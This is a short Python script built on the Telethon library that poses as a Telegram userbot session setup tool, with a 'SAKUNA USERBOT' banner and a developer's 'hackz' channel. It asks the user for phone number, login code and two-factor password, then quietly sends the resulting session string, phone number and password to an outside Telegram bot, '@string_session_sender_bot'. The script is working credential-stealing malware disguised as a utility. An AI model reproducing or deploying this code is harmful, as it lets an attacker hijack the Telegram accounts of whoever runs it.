from telethon import TelegramClient, sync
from telethon.sessions import StringSession
from telethon.errors import SessionPasswordNeededError
import os

api_id = 29728932
api_hash = "f855a539ce0d0d3810658b3dc1ebf6ce"

os.system("clear")
print("""\033[031m
     ______    ______   __    __  __    __  __    __   ______         __    __   ______   ________  _______   _______    ______  ________ 
 /      \  /      \ |  \  /  \|  \  |  \|  \  |  \ /      \       |  \  |  \ /      \ |        \|       \ |       \  /      \|        \
|  $$$$$$\|  $$$$$$\| $$ /  $$| $$  | $$| $$\ | $$|  $$$$$$\      | $$  | $$|  $$$$$$\| $$$$$$$$| $$$$$$$\| $$$$$$$\|  $$$$$$\\$$$$$$$$
| $$___\$$| $$__| $$| $$/  $$ | $$  | $$| $$$\| $$| $$__| $$      | $$  | $$| $$___\$$| $$__    | $$__| $$| $$__/ $$| $$  | $$  | $$   
 \$$    \ | $$    $$| $$  $$  | $$  | $$| $$$$\ $$| $$    $$      | $$  | $$ \$$    \ | $$  \   | $$    $$| $$    $$| $$  | $$  | $$   
 _\$$$$$$\| $$$$$$$$| $$$$$\  | $$  | $$| $$\$$ $$| $$$$$$$$      | $$  | $$ _\$$$$$$\| $$$$$   | $$$$$$$\| $$$$$$$\| $$  | $$  | $$   
|  \__| $$| $$  | $$| $$ \$$\ | $$__/ $$| $$ \$$$$| $$  | $$      | $$__/ $$|  \__| $$| $$_____ | $$  | $$| $$__/ $$| $$__/ $$  | $$   
 \$$    $$| $$  | $$| $$  \$$\ \$$    $$| $$  \$$$| $$  | $$       \$$    $$ \$$    $$| $$     \| $$  | $$| $$    $$ \$$    $$  | $$   
  \$$$$$$  \$$   \$$ \$$   \$$  \$$$$$$  \$$   \$$ \$$   \$$        \$$$$$$   \$$$$$$  \$$$$$$$$ \$$   \$$ \$$$$$$$   \$$$$$$    \$$   
                                                                                                                                       
                                                                                                                                       
                                                                                                                                         
      
Developer: @sakunadaddy001
Telegram channel: @sakunahackz
""")
      
string = input("Press enter: ")
client = TelegramClient(StringSession(string), api_id, api_hash)
phone_number = input("Please enter your phone (or bot token): ")

client.connect()

if not client.is_user_authorized():
    client.send_code_request(phone_number)
    try:
        me = client.sign_in(phone_number, input('Please enter the code you received: '))
        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}')
    except SessionPasswordNeededError:
        password = input('Please enter your password: ')
        me2 = client.sign_in(password=password)  
        client.send_message("@string_session_sender_bot", f'Session: \n```{client.session.save()}```\n\nPhone number: {phone_number}\n\nPassword: {password}')
